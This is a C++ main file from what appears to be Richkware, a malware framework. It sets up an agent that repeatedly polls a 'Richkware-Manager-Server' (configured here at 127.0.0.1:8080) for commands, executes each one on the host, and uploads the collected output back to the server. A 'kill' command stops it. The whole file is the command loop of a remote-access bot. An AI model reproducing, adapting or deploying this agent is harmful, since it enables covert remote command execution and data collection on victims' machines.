/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*/
#include <iostream>

#include "src/richkware.h"
#include "src/utils.h"


int main() {
    const char *appName = "Richk";
    RmsInfo rmsInfo(
            "richktest",
            "127.0.0.1",
            "8080",
            "Richkware-Manager-Server",
            "richk@i.it"
    );

    Richkware richkware(appName, rmsInfo);

    std::vector<std::string> commands = richkware.getCommands();
    while (true) {
        while (commands.size() == 1 && commands.at(0) == "") {
            commands = richkware.getCommands();
            std::cout << "waiting for commands..." << std::endl;
            Sleep(5000);
        }
        std::cout << "commands found: " << commands.size() << std::endl;
        std::string response = "";
        for (size_t i = 0; i < commands.size() - 1; ++i) {
            std::cout << "executing..." << commands.at(i) << std::endl;
            if (commands.at(i) == "kill") {
                return 0;
            }
            std::string resp = richkware.executeCommand(commands.at(i));
            response.append(/*Base64_encode(*/resp/*, resp.size())*/ + "##");
        }
        response.append(/*Base64_encode(*/richkware.executeCommand(commands.at(commands.size() - 1)))/*)*/;
        richkware.uploadCommandsResponse(response);
        std::cout << "response uploaded! (" << response << ")" << std::endl;
        commands.clear();
        system("PAUSE");
    }
}


